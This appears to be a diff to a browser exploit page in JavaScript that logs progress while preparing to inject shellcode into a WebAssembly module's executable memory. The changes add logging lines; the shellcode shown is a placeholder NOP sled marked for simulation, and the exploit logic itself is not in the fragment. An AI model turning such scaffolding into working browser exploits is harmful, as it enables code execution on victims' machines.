@@ -11,7 +11,7 @@
     const log = txt => document.getElementById('log').textContent += txt + "\n";
     log("Starting exploit...");
     log("Attempting to inject RWX shellcode into WASM module.");  
-    
+
     // Converts a hex string to a Uint8Array
     function hexToBytes(hex) {
       let bytes = new Uint8Array(hex.length / 2);
@@ -20,11 +20,12 @@
       }
       return bytes;
     }
-
+    log("Hex to bytes conversion function ready.");
     // Placeholder shellcode (NOP sled + illegal instruction as placeholder)
     const shellcodeHex = "90909090909090909090909090909090"; // NOP sled for simulation
+    log("Shellcode hex: " + shellcodeHex);
     const shellcodeBytes = hexToBytes(shellcodeHex);
-
+    log("Shellcode bytes: " + shellcodeBytes.length + " bytes.");
     // Build a minimal WASM module
     const wasmCode = new Uint8Array([
       0x00, 0x61, 0x73, 0x6d, // magic
